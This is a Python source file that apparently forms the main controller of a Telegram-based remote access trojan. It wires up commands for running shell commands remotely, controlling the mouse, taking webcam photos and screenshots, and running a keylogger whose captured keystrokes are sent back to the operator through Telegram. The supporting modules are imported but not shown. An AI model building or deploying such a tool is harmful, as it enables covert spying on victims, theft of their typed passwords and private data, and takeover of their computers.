from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler
from device_management import start, clients, handle_message, register_bot_device
from exec_commands import exec_command
from control_functions import mouse_control, button_callback
from media_capture import take_photo, take_screenshot
from helpers import help_command
from keylogger import start_logging, is_user_allowed
from config import TOKEN
import os

# Your bot token
# TOKEN is now imported from config.py

async def log_command(update, context):
    user_id = update.effective_user.id
    if not is_user_allowed(user_id):
        await update.message.reply_text("You are not authorized to use this bot.")
        return
        
    try:
        # Parse duration from the command argument
        duration = int(context.args[0])  # Expecting "/log <duration_in_minutes>"

        # Generate a filename using the user's username
        username = update.effective_user.username or "anonymous_user"
        filename = f"{username}.txt"
        
        # Inform the user that logging has started
        await update.message.reply_text(f"Starting keylogger for {duration} minute(s)...")

        # Start logging and get the filename
        start_logging(duration, filename)

        # Send the log file to the user
        await update.message.reply_document(document=open(filename, "rb"))

        # Clean up by deleting the log file after sending
        os.remove(filename)
        
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /log <duration_in_minutes>")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")

def main() -> None:
    register_bot_device()

    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("clients", clients))
    application.add_handler(CommandHandler("exec", exec_command))
    application.add_handler(CommandHandler("mouse", mouse_control))
    application.add_handler(CommandHandler("photo", take_photo))
    application.add_handler(CommandHandler("screenshot", take_screenshot))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("log", log_command))  # New /log command
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_callback))

    application.run_polling()

if __name__ == '__main__':
    main()